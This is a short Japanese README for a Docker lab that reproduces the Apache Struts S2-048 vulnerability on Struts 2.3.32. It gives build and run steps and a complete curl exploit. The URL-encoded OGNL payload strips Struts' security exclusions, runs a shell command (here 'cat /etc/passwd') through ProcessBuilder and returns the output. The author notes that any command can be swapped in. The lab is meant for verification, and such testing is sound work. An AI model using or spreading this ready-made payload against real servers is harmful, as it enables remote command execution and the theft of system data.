# docker_S2-048

## DockerでS2-048のPoCの検証環境を作ったのでメモ

## 必要なもの

- docker
- curl

## Struts2.3.32環境を作る

```bash
# ビルド
$ docker build -t s2/2.3.32:latest .

# 実行
$ docker run -it --rm -p 8080:8080 s2/2.3.32

・・・
Jul 08, 2017 10:03:56 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler ["ajp-apr-8009"]
Jul 08, 2017 10:03:56 AM org.apache.catalina.startup.Catalina start
INFO: Server startup in 6347 ms

```

## 確認

- 起動確認

```bash
# 下記のURLで稼働確認
http://localhost:8080/struts2-showcase/integration/saveGangster.action
```

- S2-048の確認
```bash
# 下記のコマンドで任意のコマンドを実行できることを確認

curl http://localhost:8080/struts2-showcase/integration/saveGangster.action \
 -d "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123" \
 -XPOST

# 上記の「・・・cat%20/etc/passwd・・・」の部分に任意のコマンド入れて検証
```
